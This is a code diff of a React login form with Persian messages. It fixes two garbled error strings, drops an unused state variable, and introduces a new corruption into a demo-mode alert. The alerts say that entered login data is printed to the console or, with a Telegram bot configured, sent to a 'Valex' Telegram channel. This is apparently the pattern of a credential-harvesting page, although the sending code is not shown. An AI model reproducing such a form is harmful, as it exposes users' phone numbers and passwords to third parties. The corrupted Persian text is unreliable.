@@ -64,7 +64,6 @@ export const LoginForm = () => {
   // Phone verification states
   const [verifyCode, setVerifyCode] = useState("");
   const [countdown, setCountdown] = useState(60);
-  const [isSmsCodeMode, setIsSmsCodeMode] = useState(false);
 
   // Password states
   const [password, setPassword] = useState("");
@@ -212,7 +211,7 @@ export const LoginForm = () => {
     const newErrors: { mobileNumber?: string; inviteCode?: string } = {};
 
     if (!mobileNumber) {
-      newErrors.mobileNumber = "شماره همراه ال��امی است";
+      newErrors.mobileNumber = "شماره همراه الزامی است";
     } else if (!validateMobileNumber(mobileNumber)) {
       newErrors.mobileNumber = "شماره همراه معتبر نیست";
     }
@@ -252,7 +251,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ��رسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -844,7 +843,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال ��ی‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
